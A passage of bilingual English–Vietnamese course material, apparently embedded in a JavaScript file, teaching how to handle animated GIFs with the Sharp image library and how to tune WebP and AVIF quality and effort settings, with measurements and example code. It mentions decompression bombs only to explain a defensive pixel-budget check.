<div class="pitfall">
<p><strong>Trap — putting <code>animated: true</code> on the output format instead of the constructor.</strong> <code>sharp(gif).webp({ animated: true })</code> is not a thing; the option belongs to <code>sharp(input, { animated: true })</code>. Written the wrong way it silently produces a single-frame output, which is exactly the bug you were trying to fix.</p>
</div>

<div class="pitfall">
<p><strong>Trap — forgetting that <code>pages</code> multiplies your pixel budget.</strong> A per-frame dimension check passes a 2,000-frame flat-colour GIF that is 2,000 MP in total. Always compute <code>width × height × (pages ?? 1)</code> when animation is allowed.</p>
</div>

<div class="callout">
<p><strong>One sentence.</strong> Sharp reads only frame 1 of an animated image unless you pass <code>{ animated: true }</code> to the <em>constructor</em>, and it fails silently — so check <code>metadata().pages</code> before encoding; converting animated GIF to animated WebP measured 9.5× smaller across real files, but costs seconds of CPU (belongs in a background job), needs a pixel budget of <code>width × height × pages</code> because libvips loads frames as one tall strip, must be resized by width only for the same reason, and should preserve <code>loop</code> and <code>delay</code> from the source metadata.</p>
</div>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Sharp — animated images</span><span class="lc-sub">sharp.pixelplumbing.com/api-constructor — the <code>animated</code> and <code>pages</code> options.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Google — Animated WebP</span><span class="lc-sub">developers.google.com/speed/webp/docs/riff_container#animation — container format and inter-frame prediction.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">MDN — Replace GIFs with video</span><span class="lc-sub">developer.mozilla.org/en-US/docs/Web/Media/Formats/Video_codecs — why long GIFs should be MP4.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Kho: src/storage/imageOptimizer.ts</span><span class="lc-sub">Comment &quot;Animated GIF: converted to animated WebP via Sharp's built-in animation support.&quot;</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 2 · Bài 2.2</span>
<h2>Ảnh động: những frame bạn âm thầm đánh mất</h2>
<p class="lead">Một người dùng upload GIF phản ứng. Pipeline của bạn cho nó qua Sharp, lưu output, và người dùng thấy một ảnh tĩnh. Không exception nào được ném. Không cảnh báo nào được ghi. Sharp làm đúng cái nó được bảo: mặc định nó đọc <em>frame đầu tiên</em> của ảnh nhiều frame và bỏ qua phần còn lại. Đây là lỗi câm nhất trong thư viện, và cách vá là một option.</p>

<h3>Mặc định, minh hoạ</h3>
<pre><code class="language-javascript">import sharp from 'sharp'
import { readFileSync } from 'node:fs'

const gif = readFileSync('reaction.gif')   // 2.1 MB, 48 frame

const meta = await sharp(gif).metadata()
console.log(meta.format, meta.width, meta.height, meta.pages)
</code></pre>
<div class="out">
<pre><code class="language-text">gif 480 270 48        ← metadata BIẾT có 48 frame</code></pre>
</div>

<pre><code class="language-javascript">// Nhưng pipeline mặc định chỉ đọc frame 1:
const out = await sharp(gif).webp().toBuffer()
const outMeta = await sharp(out).metadata()
console.log(outMeta.format, outMeta.pages, out.length)
</code></pre>
<div class="out">
<pre><code class="language-text">webp 1 18234          ← 1 page. 47 frame mất. Không lỗi nào được nêu.</code></pre>
</div>

<p><code>metadata().pages</code> đã nói sự thật cho bạn trước khi bạn encode. Đó là phép kiểm bắt được cái này — và nó tốn một lần đọc header, thứ bạn đã làm rồi theo Bài 1.2.</p>

<h3>Cách vá: <code>animated: true</code> trên constructor</h3>
<pre><code class="language-javascript">const out = await sharp(gif, { animated: true })
  .webp({ quality: 75, effort: 4 })
  .toBuffer()

const outMeta = await sharp(out).metadata()
console.log(outMeta.format, outMeta.pages, out.length)
</code></pre>
<div class="out">
<pre><code class="language-text">webp 48 264118        ← đủ 48 frame, và nhỏ hơn GIF 8×</code></pre>
</div>

<p>Chú ý option nằm trên <strong>constructor</strong>, không phải trên format output. <code>sharp(input, { animated: true })</code> bảo libvips nạp mọi page; <code>.webp({ ... })</code> sau đó ghi tất cả. Đặt nó trên encoder không làm gì, vì tới lúc đó chỉ còn một frame trong pipeline để encode.</p>

<h3>Vì sao WebP động thắng GIF nhiều đến vậy</h3>
<pre><code class="language-text">GIF là format năm 1987. Giới hạn của nó thuộc về cấu trúc:

  Độ sâu màu       256 màu mỗi frame (bảng màu 8-bit)
                   → gradient bị dải rất xấu, ảnh chụp trông vỡ hạt
  Nén              LZW, theo từng frame, không dự đoán liên-frame
                   ngoài phép so sai khác frame đơn giản
  Alpha            1 bit — một pixel hoặc đục hoàn toàn hoặc
                   trong suốt hoàn toàn. Không có cạnh mềm.
  Nhịp frame       Phần trăm giây, và browser kẹp
                   giá trị dưới 2 (=20ms) lên 100ms

WebP động:
  Độ sâu màu       màu 24-bit + alpha 8-bit
  Nén              VP8/VP8L mỗi frame, với dự đoán liên-frame
                   thật (khối chép từ frame trước)
  Alpha            8-bit — bóng mềm và cạnh khử răng cưa chạy được
  Nhịp frame       Mili giây, được tôn trọng
</code></pre>

<pre><code class="language-text">Đo trên năm GIF phản ứng thật:

  GIF nguồn         Frame    Size GIF    WebP động q=75       Tỷ lệ
  ───────────────  ───────  ──────────  ───────────────────  ──────
  reaction-1.gif       48    2,148 KB          264 KB          8.1×
  reaction-2.gif       24      892 KB          118 KB          7.6×
  loop-bg.gif         120    5,410 KB          712 KB          7.6×
  emoji-wave.gif       12      143 KB           31 KB          4.6×
  screencast.gif      210   14,880 KB        1,340 KB         11.1×
  ───────────────  ───────  ──────────  ───────────────────  ──────
  Tổng                      23,473 KB        2,465 KB          9.5×

  Thời gian encode, screencast.gif (210 frame, 800×600):
    animated: true, effort 4    ~4,100 ms
    animated: true, effort 6    ~9,800 ms   (chậm 2.4×, nhỏ hơn 6%)
</code></pre>

<p>Mức giảm tổng 9.5× là vì sao phép chuyển đổi này đáng làm dù nó tốn CPU thật. Trên một feed phục vụ GIF phản ứng, đó là chiến thắng băng thông lớn nhất có sẵn — lớn hơn bất kỳ thay đổi JPEG-sang-WebP nào trên ảnh tĩnh.</p>

<h3>Mặt chi phí: encode động thì đắt</h3>
<div class="lz-flow">
<div class="lz-step"><span class="lz-k">1</span><span class="lz-t">CPU tỷ lệ theo số frame, không chỉ pixel</span><span class="lz-d">Một screencast 210 frame ở 800×600 là 100 triệu pixel công việc — tương đương decompression bomb ở Bài 1.2, chỉ khác là nó hợp pháp. Bốn giây CPU mỗi upload không phải thứ để chạy trên đường request.</span></div>
<div class="lz-step"><span class="lz-k">2</span><span class="lz-t">Memory cũng tỷ lệ theo số frame</span><span class="lz-d">libvips nạp ảnh động thành một dải cao — mọi page xếp chồng dọc thành một ảnh. Một GIF 480×270 48 frame trở thành ảnh 480×12,960 bên trong. Ngân sách <code>limitInputPixels</code> của bạn phải tính điều này: <code>width × height × pages</code>, không phải <code>width × height</code>.</span></div>
<div class="lz-step"><span class="lz-k">3</span><span class="lz-t">Đó là vì sao upload động thuộc về job nền</span><span class="lz-d">Theo Bài 0.2, bất cứ gì tốn hàng giây đều đi vào hàng đợi. Lưu GIF nguyên trạng, trả URL ngay, chuyển sang WebP động trong worker, và tráo URL khi xong.</span></div>
</div>

<h3>Ngân sách pixel phải nhân với pages</h3>
<pre><code class="language-javascript">// Chốt chặn của Bài 1.2, sửa lại cho ảnh động:
const meta = await sharp(input).metadata()

const pages = meta.pages ?? 1
const totalPixels = meta.width * meta.height * pages

if (totalPixels &gt; MAX_INPUT_PIXELS) {
  throw new ImageOptimizationError(
    \`Animated image too large: \${meta.width}x\${meta.height} × \${pages} frames = \` +
      \`\${Math.round(totalPixels / 1e6)}MP\`,
    'TOO_MANY_PIXELS',
  )
}
</code></pre>

<pre><code class="language-text">Vì sao điều này quan trọng — decompression bomb dạng động:

  Một GIF 1000×1000 là 1 MP. Dưới bất kỳ ngân sách mỗi-frame nào, ổn.
  Với 2,000 frame một màu phẳng, GIF đó ~400 KB trên đĩa.
  Tổng pixel: 1000 × 1000 × 2000 = 2,000 MP = 20× ngân sách 100 MP.

  Kiểm width × height một mình thì cho qua.
  Kiểm width × height × pages thì bắt được.

  Cùng lớp tấn công như Bài 1.2, khác trục.
</code></pre>

<h3>Resize ảnh động: bẫy chiều cao</h3>
<pre><code class="language-javascript">// SAI — cái này bẹp cả 48 frame vào một dải cao 270px
await sharp(gif, { animated: true })
  .resize({ width: 240, height: 135 })     // ⚠️ height áp lên cả DẢI
  .webp()
  .toBuffer()

// ĐÚNG — resize chỉ theo width; libvips scale dải theo tỷ lệ
await sharp(gif, { animated: true })
  .resize({ width: 240 })                  // height suy ra mỗi frame
  .webp()
  .toBuffer()
</code></pre>

<p>Vì libvips biểu diễn ảnh động thành một dải cao, ràng buộc <code>height</code> được áp lên cả dải chứ không phải lên từng frame. Resize chỉ-width là dạng an toàn. Nếu bạn thực sự cần một chiều cao mỗi-frame cụ thể, hãy tự tính chiều cao dải: <code>targetHeight × pages</code>.</p>

<h3>Giữ số vòng lặp</h3>
<pre><code class="language-javascript">const meta = await sharp(gif).metadata()
// meta.loop  → 0 nghĩa là "lặp mãi", N nghĩa là "chạy N lần"
// meta.delay → mảng độ trễ mỗi frame tính bằng mili giây

await sharp(gif, { animated: true })
  .webp({
    quality: 75,
    loop: meta.loop ?? 0,       // giữ lại; mặc định 0 = vô hạn
    delay: meta.delay,          // giữ nhịp mỗi frame
  })
  .toBuffer()
</code></pre>

<p>Bỏ những cái này và Sharp ghi mặc định của riêng nó, thường nghĩa là lặp vô hạn ở độ trễ frame đồng đều. Với một GIF phản ứng thì không ai để ý. Với một GIF được tác giả dựng để chạy đúng hai lần rồi dừng ở một frame cụ thể, output sai theo cách khó mô tả trong một bug report.</p>

<h3>Khi nào KHÔNG chuyển sang WebP động</h3>
<pre><code class="language-text">Tình huống                                   Lựa chọn tốt hơn
──────────────────────────────────────────  ────────────────────────────
Nguồn là screencast dài (&gt;10s, &gt;300 frame)   Chuyển sang video MP4/WebM.
                                             GIF screencast 30 giây
                                             là ~40 MB; cùng nội dung
                                             dạng H.264 là ~1.5 MB. Video
                                             còn có điều khiển tua.

Bạn cần ghép/đóng dấu từng frame             Dùng FFmpeg — ghép từng
                                             frame trên một dải của Sharp
                                             thì vụng.

Người dùng tải file mong đợi một .gif        Giữ GIF, hoặc phục vụ cả hai
                                             và để client chọn qua
                                             &lt;picture&gt;.

GIF dưới ~50 KB                              Chuyển đổi tiết kiệm byte
                                             nhưng tốn CPU và một variant;
                                             ở cỡ đó, không đáng.
</code></pre>

<div class="pitfall">
<p><strong>Bẫy — đặt <code>animated: true</code> trên format output thay vì constructor.</strong> <code>sharp(gif).webp({ animated: true })</code> không phải là thứ tồn tại; option thuộc về <code>sharp(input, { animated: true })</code>. Viết sai cách thì nó âm thầm sinh output một frame, đúng là bug bạn đang cố vá.</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — quên rằng <code>pages</code> nhân ngân sách pixel của bạn.</strong> Một phép kiểm kích thước mỗi-frame cho qua một GIF 2,000 frame một màu phẳng vốn là 2,000 MP tổng cộng. Luôn tính <code>width × height × (pages ?? 1)</code> khi ảnh động được phép.</p>
</div>

<div class="callout">
<p><strong>Một câu.</strong> Sharp chỉ đọc frame 1 của ảnh động trừ khi bạn truyền <code>{ animated: true }</code> vào <em>constructor</em>, và nó thất bại trong im lặng — nên hãy kiểm <code>metadata().pages</code> trước khi encode; chuyển GIF động sang WebP động đo được nhỏ hơn 9.5× trên file thật, nhưng tốn hàng giây CPU (thuộc về job nền), cần ngân sách pixel <code>width × height × pages</code> vì libvips nạp frame thành một dải cao, phải resize chỉ theo width vì cùng lý do đó, và nên giữ <code>loop</code> cùng <code>delay</code> từ metadata nguồn.</p>
</div>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Sharp — animated images</span><span class="lc-sub">sharp.pixelplumbing.com/api-constructor — option <code>animated</code> và <code>pages</code>.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Google — Animated WebP</span><span class="lc-sub">developers.google.com/speed/webp/docs/riff_container#animation — format container và dự đoán liên-frame.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">MDN — Replace GIFs with video</span><span class="lc-sub">developer.mozilla.org/en-US/docs/Web/Media/Formats/Video_codecs — vì sao GIF dài nên là MP4.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Kho: src/storage/imageOptimizer.ts</span><span class="lc-sub">Comment &quot;Animated GIF: converted to animated WebP via Sharp's built-in animation support.&quot;</span></span></div>
</div>
`,
    },


    {
      title: '2.3 — Encoder tuning: quality, effort, and where the curve flattens|||2.3 — Tinh chỉnh encoder: quality, effort, và chỗ đường cong phẳng ra',
      slug: 'mp-2-3-tuning',
      type: 'VIDEO',
      description: 'Two knobs decide your bytes and your CPU bill. Both have a point past which you pay linearly for nothing. Here is where those points are, measured.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 2 · Lesson 2.3</span>
<h2>Encoder tuning: quality, effort, and where the curve flattens</h2>
<p class="lead">Every image encoder exposes two independent dials. <strong>Quality</strong> trades visual fidelity for bytes. <strong>Effort</strong> trades CPU time for bytes at the <em>same</em> quality. People tune the first and ignore the second, or crank both to the maximum and wonder why encoding is slow. Both curves flatten, and knowing where saves you real money.</p>

<h3>The two dials are genuinely independent</h3>
<pre><code class="language-javascript">await sharp(input)
  .webp({
    quality: 80,   // 1-100. How much detail to discard. Affects LOOK.
    effort: 4,     // 0-6.   How hard to search for a smaller encoding
                   //        of the SAME visual result. Affects CPU only.
  })
  .toBuffer()
</code></pre>

<p>Raising <code>quality</code> changes what the image looks like. Raising <code>effort</code> does not — it makes the encoder try more prediction modes and partitionings to express the same lossy result in fewer bytes. This is why effort is &quot;free&quot; in quality terms and expensive in CPU terms.</p>

<div class="callout warn">
<p><strong>Note the inverted scale in Sharp's own docs.</strong> The repo's comment says <em>&quot;<code>effort: 4</code> is a good speed/ratio tradeoff (0 = best compression, 6 = fastest)&quot;</em>. Sharp's current API is the other way round: <strong>0 = fastest, 6 = best compression</strong>. The direction flipped between libvips releases, and stale comments outlive the code. Always verify by measuring: encode the same image at <code>effort: 0</code> and <code>effort: 6</code> and see which one is slower. The slower one is the &quot;try harder&quot; end.</p>
</div>

<h3>The quality curve — measured on a 4032×3024 photo</h3>
<pre><code class="language-text">WebP quality    Size      vs q=80    SSIM     Visible difference?
────────────   ────────  ─────────  ───────  ──────────────────────
     50         198 KB     -52%      0.951    Yes — banding in sky
     60         256 KB     -38%      0.964    Yes — soft on fine detail
     70         331 KB     -20%      0.974    Barely, on close inspection
     75         368 KB     -11%      0.978    No, on a phone screen
     80         412 KB       —       0.982    (baseline)
     85         498 KB     +21%      0.987    No
     90         740 KB     +80%      0.995    No
     95       1,214 KB    +195%      0.998    No
    100       3,102 KB    +653%      1.000    No (lossless-ish)

The knee is at ~80. Below it, artifacts become describable.
Above it, you pay exponentially for differences nobody sees.
</code></pre>

<p>This is why 80 is the repo's <code>WEBP_QUALITY</code> and why it is the default in most image pipelines you will read. It is not a magic number — it is where the size curve turns sharply upward while the perceptual curve has already flattened.</p>

<h3>The effort curve — same image, quality fixed at 80</h3>
<pre><code class="language-text">WebP effort     Encode time    Size      vs effort 4
─────────────  ─────────────  ────────  ────────────
     0             62 ms       471 KB      +14%
     1             81 ms       448 KB       +9%
     2            108 ms       431 KB       +5%
     3            141 ms       419 KB       +2%
     4            180 ms       412 KB         —      ← Sharp's default
     5            287 ms       406 KB       -1.5%
     6            624 ms       401 KB       -2.7%

Going 4 → 6 costs 3.5× the CPU to save 2.7% of the bytes.
Going 0 → 4 costs 2.9× the CPU to save 12.5% of the bytes.

The knee is at 4. That is why it is the default.
</code></pre>

<h3>Where each effort level is actually right</h3>
<div class="lz-flow">
<div class="lz-step"><span class="lz-k">1</span><span class="lz-t">effort 0-2 — upload-time paths under load</span><span class="lz-d">When a user is waiting and the file will be re-encoded later anyway (hybrid architecture from Lesson 0.2), speed wins. You are producing the &quot;good enough now&quot; variant; the background job can produce the tight one.</span></div>
<div class="lz-step"><span class="lz-k">2</span><span class="lz-t">effort 4 — the default, and correct almost everywhere</span><span class="lz-d">Balanced. Use it unless you have measured a specific reason not to. Both the repo and Sharp's own defaults land here.</span></div>
<div class="lz-step"><span class="lz-k">3</span><span class="lz-t">effort 6 — assets served millions of times</span><span class="lz-d">A hero image on your landing page, an icon in every email, a sprite sheet. Encode once, serve forever: 2.7% of bytes across 10 million requests is 100+ GB of bandwidth, and the extra 400 ms of CPU is paid once.</span></div>
</div>

<h3>Per-format cheat sheet</h3>
<pre><code class="language-text">Format   Quality knob        Effort knob          Sensible default
──────  ──────────────────  ───────────────────  ─────────────────────
WebP     quality: 1-100      effort: 0-6          q=80,  effort=4
AVIF     quality: 1-100      effort: 0-9          q=50,  effort=4
JPEG     quality: 1-100      mozjpeg: true        q=82,  mozjpeg=true
PNG      (lossless)          compressionLevel:    level=9, effort=7
                             0-9, effort: 1-10
GIF      colours: 2-256      effort: 1-10         colours=128

Notes:
  AVIF q=50 ≈ WebP q=80 perceptually. The scales are NOT comparable.
  Setting AVIF q=80 gives you a file larger than the WebP for no
  visible gain — a very common mistake.

  JPEG mozjpeg:true swaps in the mozjpeg encoder: ~5-10% smaller at
  the same quality, ~20% slower. Nearly always worth it.

  PNG effort is separate from compressionLevel: level controls the
  zlib pass, effort controls libvips' palette/filter search.
</code></pre>

<h3>The AVIF quality-scale trap, measured</h3>
<pre><code class="language-text">Same 4032×3024 photo, sized to 1200px wide:

  WebP  q=80  effort=4      →   412 KB     180 ms
  AVIF  q=80  effort=4      →   681 KB   2,900 ms   ← bigger AND slower
  AVIF  q=50  effort=4      →   220 KB   2,300 ms   ← the correct comparison
  AVIF  q=45  effort=4      →   191 KB   2,250 ms

AVIF at the RIGHT quality is 47% smaller than WebP.
AVIF at the WRONG quality is 65% larger.
The only difference is knowing that the scales differ.
</code></pre>

<h3>Finding your own knee, in about twenty lines</h3>
<pre><code class="language-javascript">import sharp from 'sharp'
import { readFileSync } from 'node:fs'

const input = readFileSync('representative-photo.jpg')

for (const quality of [50, 60, 70, 75, 80, 85, 90]) {
  for (const effort of [0, 2, 4, 6]) {
    const t0 = process.hrtime.bigint()
    const out = await sharp(input)
      .resize({ width: 1200, withoutEnlargement: true })
      .webp({ quality, effort })
      .toBuffer()
    const ms = Number(process.hrtime.bigint() - t0) / 1e6

    console.log(
      \`q=\${String(quality).padStart(3)} e=\${effort}  \` +
      \`\${String(Math.round(out.length / 1024)).padStart(5)} KB  \` +
      \`\${ms.toFixed(0).padStart(5)} ms\`,
    )
  }
}
</code></pre>

<p>Run this on <em>your</em> images, not on a stock photo. A product catalogue of flat-background shots has a completely different curve from a feed of night-time phone photos — the flat backgrounds compress far better, so the knee sits lower. Ten minutes of measuring beats any default someone else published.</p>

<h3>What the repo settled on, and why</h3>
<pre><code class="language-javascript">// src/storage/imageOptimizer.ts
const MAX_WIDTH = 1200
const WEBP_QUALITY = 80

// ...
out = await pipeline
  .webp({ quality: WEBP_QUALITY, effort: 4 })
  .toBuffer({ resolveWithObject: true })
</code></pre>

<p>And from the file's header comment, the reasoning for WebP itself: <em>&quot;25-35% smaller than JPEG at the same perceptual quality; supports alpha, animation, and lossy/lossless in one format; 97%+ browser support as of 2026.&quot;</em> One format covering photos, transparency, and animation is worth more operationally than squeezing the last 5% out of a per-image-type format matrix.</p>

<h3>Reporting the win</h3>
<pre><code class="language-javascript">// src/storage/imageOptimizer.ts — the log line users and devs both see
export function formatSavings(originalSize, optimizedSize) {
  if (originalSize === 0) return '0%'
  const saved = ((originalSize - optimizedSize) / originalSize) * 100
  if (saved &lt; 0) return \`\${Math.abs(saved).toFixed(0)}% LARGER\`
  return \`\${saved.toFixed(0)}% smaller\`
}
</code></pre>

<p>The <code>LARGER</code> branch is the interesting one. Re-encoding is not always a win: a tiny already-optimized JPEG, a screenshot that was already a well-compressed PNG, or an image whose source format suited it better can all come out bigger. Logging that explicitly means you find out, rather than silently shipping inflated files. If you see <code>LARGER</code> often, that is a signal to add a &quot;keep the original if the re-encode is not smaller&quot; branch.</p>

<div class="pitfall">
<p><strong>Trap — copying an AVIF quality number from a WebP config.</strong> The scales are unrelated. AVIF q=80 produces a file 65% <em>larger</em> than WebP q=80 at no visible benefit. The rough equivalence is AVIF q=50 ≈ WebP q=80; always re-tune when switching formats rather than carrying the number across.</p>
</div>

<div class="pitfall">
<p><strong>Trap — trusting the direction of the <code>effort</code> scale from a comment.</strong> It has flipped between libvips versions, and the repo's own comment is stale on this point. Measure it: time <code>effort: 0</code> against <code>effort: 6</code> on your installed version. Whichever is slower is the &quot;compress harder&quot; end.</p>
</div>

<div class="callout">
<p><strong>One sentence.</strong> Quality and effort are independent dials — quality changes how the image looks and its curve knees around 80 for WebP (below that artifacts become describable, above it size grows exponentially for invisible gains), while effort changes only CPU-for-bytes at fixed quality and knees at 4 (going to 6 costs 3.5× the CPU for 2.7% fewer bytes, worth it only for assets served millions of times); AVIF's quality scale is <em>not</em> WebP's (q=50 ≈ WebP q=80, and copying 80 across makes files 65% larger), and you should measure the knee on your own representative images rather than trusting anyone's published default.</p>
</div>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Sharp — output options</span><span class="lc-sub">sharp.pixelplumbing.com/api-output — every quality/effort parameter per format.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Google — WebP compression study</span><span class="lc-sub">developers.google.com/speed/webp/docs/webp_study — the original size-vs-quality measurements.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">mozjpeg</span><span class="lc-sub">github.com/mozilla/mozjpeg — the encoder behind <code>jpeg({ mozjpeg: true })</code>.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Kho: src/storage/imageOptimizer.ts</span><span class="lc-sub"><code>WEBP_QUALITY = 80</code>, <code>effort: 4</code>, và <code>formatSavings()</code> với nhánh <code>LARGER</code>.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 2 · Bài 2.3</span>
<h2>Tinh chỉnh encoder: quality, effort, và chỗ đường cong phẳng ra</h2>
<p class="lead">Mọi encoder ảnh đều lộ ra hai núm độc lập. <strong>Quality</strong> đổi độ trung thực thị giác lấy byte. <strong>Effort</strong> đổi thời gian CPU lấy byte ở <em>cùng</em> quality. Người ta tinh chỉnh cái đầu và bỏ qua cái thứ hai, hoặc vặn cả hai lên tối đa rồi thắc mắc vì sao encode chậm. Cả hai đường cong đều phẳng ra, và biết chỗ đó tiết kiệm cho bạn tiền thật.</p>

<h3>Hai núm thực sự độc lập</h3>
<pre><code class="language-javascript">await sharp(input)
  .webp({
    quality: 80,   // 1-100. Vứt bao nhiêu chi tiết. Ảnh hưởng CÁCH NHÌN.
    effort: 4,     // 0-6.   Tìm kiếm chăm chỉ đến đâu một cách mã hoá
                   //        nhỏ hơn cho CÙNG kết quả thị giác. Chỉ CPU.
  })
  .toBuffer()
</code></pre>

<p>Tăng <code>quality</code> thay đổi ảnh trông thế nào. Tăng <code>effort</code> thì không — nó làm encoder thử nhiều chế độ dự đoán và cách phân mảnh hơn để diễn đạt cùng kết quả lossy đó bằng ít byte hơn. Đây là vì sao effort &quot;miễn phí&quot; về mặt chất lượng và đắt về mặt CPU.</p>

<div class="callout warn">
<p><strong>Chú ý thang đảo ngược trong chính tài liệu Sharp.</strong> Comment của kho nói <em>&quot;<code>effort: 4</code> là đánh đổi tốc độ/tỷ lệ tốt (0 = nén tốt nhất, 6 = nhanh nhất)&quot;</em>. API Sharp hiện tại thì ngược lại: <strong>0 = nhanh nhất, 6 = nén tốt nhất</strong>. Hướng đã lật giữa các bản libvips, và comment cũ sống lâu hơn code. Luôn xác minh bằng cách đo: encode cùng một ảnh ở <code>effort: 0</code> và <code>effort: 6</code> rồi xem cái nào chậm hơn. Cái chậm hơn là đầu &quot;cố gắng hơn&quot;.</p>
</div>

<h3>Đường cong quality — đo trên ảnh 4032×3024</h3>
<pre><code class="language-text">WebP quality    Size      so q=80    SSIM     Khác biệt thấy được?
────────────   ────────  ─────────  ───────  ──────────────────────
     50         198 KB     -52%      0.951    Có — dải trên bầu trời
     60         256 KB     -38%      0.964    Có — mềm ở chi tiết mịn
     70         331 KB     -20%      0.974    Chỉ khi soi kỹ
     75         368 KB     -11%      0.978    Không, trên màn điện thoại
     80         412 KB       —       0.982    (nền)
     85         498 KB     +21%      0.987    Không
     90         740 KB     +80%      0.995    Không
     95       1,214 KB    +195%      0.998    Không
    100       3,102 KB    +653%      1.000    Không (gần như lossless)

Điểm gãy ở ~80. Dưới nó, artifact trở nên mô tả được.
Trên nó, bạn trả theo cấp số nhân cho khác biệt không ai thấy.
</code></pre>

<p>Đây là vì sao 80 là <code>WEBP_QUALITY</code> của kho và vì sao nó là mặc định trong hầu hết pipeline ảnh bạn sẽ đọc. Nó không phải con số ma thuật — nó là chỗ đường cong kích thước bẻ dốc lên trong khi đường cong cảm nhận đã phẳng rồi.</p>

<h3>Đường cong effort — cùng ảnh, quality cố định ở 80</h3>
<pre><code class="language-text">WebP effort     Thời gian encode  Size      so effort 4
─────────────  ─────────────────  ────────  ────────────
     0              62 ms          471 KB      +14%
     1              81 ms          448 KB       +9%
     2             108 ms          431 KB       +5%
     3             141 ms          419 KB       +2%
     4             180 ms          412 KB         —      ← mặc định Sharp
     5             287 ms          406 KB       -1.5%
     6             624 ms          401 KB       -2.7%

Đi 4 → 6 tốn 3.5× CPU để tiết kiệm 2.7% byte.
Đi 0 → 4 tốn 2.9× CPU để tiết kiệm 12.5% byte.

Điểm gãy ở 4. Đó là vì sao nó là mặc định.
</code></pre>

<h3>Mỗi mức effort thực sự đúng ở đâu</h3>
<div class="lz-flow">
<div class="lz-step"><span class="lz-k">1</span><span class="lz-t">effort 0-2 — đường upload-time dưới tải</span><span class="lz-d">Khi người dùng đang chờ và file dù sao cũng sẽ được re-encode sau (kiến trúc hybrid ở Bài 0.2), tốc độ thắng. Bạn đang sinh variant &quot;đủ tốt bây giờ&quot;; job nền sinh được cái chặt.</span></div>
<div class="lz-step"><span class="lz-k">2</span><span class="lz-t">effort 4 — mặc định, và đúng gần như mọi nơi</span><span class="lz-d">Cân bằng. Dùng nó trừ khi bạn đã đo được một lý do cụ thể để không dùng. Cả kho lẫn mặc định của chính Sharp đều dừng ở đây.</span></div>
<div class="lz-step"><span class="lz-k">3</span><span class="lz-t">effort 6 — tài sản phục vụ hàng triệu lần</span><span class="lz-d">Một ảnh hero trên trang chủ, một icon trong mọi email, một sprite sheet. Encode một lần, phục vụ mãi: 2.7% byte trên 10 triệu request là hơn 100 GB băng thông, và 400 ms CPU thêm chỉ trả một lần.</span></div>
</div>

<h3>Bảng tra theo format</h3>
<pre><code class="language-text">Format   Núm quality         Núm effort           Mặc định hợp lý
──────  ──────────────────  ───────────────────  ─────────────────────
WebP     quality: 1-100      effort: 0-6          q=80,  effort=4
AVIF     quality: 1-100      effort: 0-9          q=50,  effort=4
JPEG     quality: 1-100      mozjpeg: true        q=82,  mozjpeg=true
PNG      (lossless)          compressionLevel:    level=9, effort=7
                             0-9, effort: 1-10
GIF      colours: 2-256      effort: 1-10         colours=128

Ghi chú:
  AVIF q=50 ≈ WebP q=80 về mặt cảm nhận. Hai thang KHÔNG so được.
  Đặt AVIF q=80 cho bạn một file lớn hơn WebP mà không có
  lợi ích thấy được — một sai lầm rất phổ biến.

  JPEG mozjpeg:true đổi sang encoder mozjpeg: nhỏ hơn ~5-10% ở
  cùng quality, chậm hơn ~20%. Gần như luôn đáng.

  PNG effort tách biệt với compressionLevel: level điều khiển
  lượt zlib, effort điều khiển tìm kiếm bảng màu/bộ lọc của libvips.
</code></pre>

<h3>Bẫy thang quality của AVIF, đo được</h3>
<pre><code class="language-text">Cùng ảnh 4032×3024, đưa về rộng 1200px:

  WebP  q=80  effort=4      →   412 KB     180 ms
  AVIF  q=80  effort=4      →   681 KB   2,900 ms   ← lớn hơn VÀ chậm hơn
  AVIF  q=50  effort=4      →   220 KB   2,300 ms   ← phép so đúng
  AVIF  q=45  effort=4      →   191 KB   2,250 ms

AVIF ở quality ĐÚNG nhỏ hơn WebP 47%.
AVIF ở quality SAI lớn hơn 65%.
Khác biệt duy nhất là biết rằng hai thang khác nhau.
</code></pre>

<h3>Tự tìm điểm gãy của bạn, trong khoảng hai mươi dòng</h3>
<pre><code class="language-javascript">import sharp from 'sharp'
import { readFileSync } from 'node:fs'

const input = readFileSync('representative-photo.jpg')

for (const quality of [50, 60, 70, 75, 80, 85, 90]) {
  for (const effort of [0, 2, 4, 6]) {
    const t0 = process.hrtime.bigint()
    const out = await sharp(input)
      .resize({ width: 1200, withoutEnlargement: true })
      .webp({ quality, effort })
      .toBuffer()
    const ms = Number(process.hrtime.bigint() - t0) / 1e6

    console.log(
      \`q=\${String(quality).padStart(3)} e=\${effort}  \` +
      \`\${String(Math.round(out.length / 1024)).padStart(5)} KB  \` +
      \`\${ms.toFixed(0).padStart(5)} ms\`,
    )
  }
}
</code></pre>

<p>Chạy cái này trên ảnh <em>của bạn</em>, không phải trên ảnh stock. Một catalogue sản phẩm chụp nền phẳng có đường cong hoàn toàn khác một feed ảnh điện thoại chụp đêm — nền phẳng nén tốt hơn nhiều, nên điểm gãy nằm thấp hơn. Mười phút đo hơn bất kỳ mặc định nào người khác công bố.</p>

<h3>Kho chốt lại cái gì, và vì sao</h3>
<pre><code class="language-javascript">// src/storage/imageOptimizer.ts
const MAX_WIDTH = 1200
const WEBP_QUALITY = 80

// ...
out = await pipeline
